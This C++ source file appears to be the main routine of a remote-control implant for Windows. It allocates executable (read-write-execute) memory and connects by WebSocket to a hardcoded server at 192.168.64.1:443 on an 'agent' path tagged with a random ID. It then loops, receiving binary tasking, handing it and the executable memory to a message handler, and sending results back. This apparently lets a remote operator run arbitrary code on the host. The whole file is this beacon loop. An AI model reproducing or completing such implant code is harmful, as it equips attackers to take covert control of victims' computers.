#include "global.hpp"
#include "connection.hpp"
#include "identifier.hpp"

using namespace std;

PVOID getMem(SIZE_T size, DWORD dwProtect);

PVOID scratchpad;

bool handleMessage(
    const char* input,
    size_t inputSize,
    char* output,
    size_t outputCapacity,
    size_t& outputSize,
    PVOID mem
);

int main() {
    PVOID mem = getMem(0x1000, PAGE_EXECUTE_READWRITE);
    scratchpad = getMem(0x100000, PAGE_READWRITE);

    const wchar_t* host = L"192.168.64.1";
    const INTERNET_PORT port = 443;
    const bool useHttps = true;

    wchar_t identifier[37];
    random_uuid(identifier);

    wchar_t path[128];
    const wchar_t* basePath = L"/api/v1/anon/agent/ws/";

    size_t baseLen = wcslen(basePath);
    size_t idLen = wcslen(identifier);

    if (baseLen + idLen + 1 > sizeof(path) / sizeof(wchar_t)) {
        return 1;
    }

    wcscpy(path, basePath);
    wcscat(path, identifier);

    WebSocketClient client = {};

    if (!connectWebSocket(client, host, port, path, useHttps)) {
        cleanup(client);
        return 1;
    }

    char *messageBuffer = (char*) getMem(0x100000, PAGE_READWRITE);
    char *responseBuffer = (char*) getMem(0x100000, PAGE_READWRITE);
    size_t messageSize = 0;
    size_t responseSize = 0;

    while (true) {
        if (!receiveBinary(
                client.websocket,
                messageBuffer,
                0x100000,
                messageSize)) {
            break;
        }
        
        if (!handleMessage(
                messageBuffer,
                messageSize,
                responseBuffer,
                0x100000,
                responseSize,
                mem)) {
            break;
        }

        if (!sendBinary(client.websocket, responseBuffer, responseSize)) {
            break;
        }
    }

    DWORD closeResult = WinHttpWebSocketClose(
        client.websocket,
        WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS,
        nullptr,
        0
    );

    if (closeResult != NO_ERROR) {
        cleanup(client);
        return 1;
    }

    cleanup(client);
    return 0;
}